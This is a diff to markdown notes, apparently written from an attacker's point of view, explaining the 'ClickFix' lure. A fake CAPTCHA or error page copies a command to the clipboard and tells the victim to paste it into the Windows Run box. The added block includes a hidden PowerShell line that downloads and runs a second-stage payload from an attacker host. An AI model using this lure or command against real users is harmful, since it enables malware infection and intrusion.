@@ -1,4 +1,11 @@
-**ClickFix** — a "self-pwn" social-engineering technique: a fake CAPTCHA, browser error, or "document failed to render / verify you are human" prompt instructs the victim to **press Win+R, paste, and Enter**. Malicious JavaScript has silently copied a command to their clipboard, so the paste runs your PowerShell/mshta payload. No attachment, no download for the mail gateway to scan - the victim executes the code themselves. It became one of the top initial-access vectors in 2025-2026.
+**ClickFix** — trick the victim into running your command for you. A fake CAPTCHA, browser error, or "document failed to render / verify you are human" prompt tells them to **press Win+R** (the Windows Run box), **paste, and hit Enter** — while page JavaScript has quietly copied a malicious command to their clipboard, so the paste launches your PowerShell/mshta payload. Because the victim executes the code by hand and nothing is downloaded, there is no attachment for the mail gateway to scan and no Mark-of-the-Web to slow it down; it became one of the top initial-access vectors in 2025-2026.
+
+```
+fake CAPTCHA -> page JS copies command to clipboard
+victim: Win+R (Run box) -> Ctrl+V -> Enter
+runs: powershell -w hidden -c "iwr .../s -useb | iex"
+   -> downloads + runs second stage from attacker
+```
 
 ## How it works
 
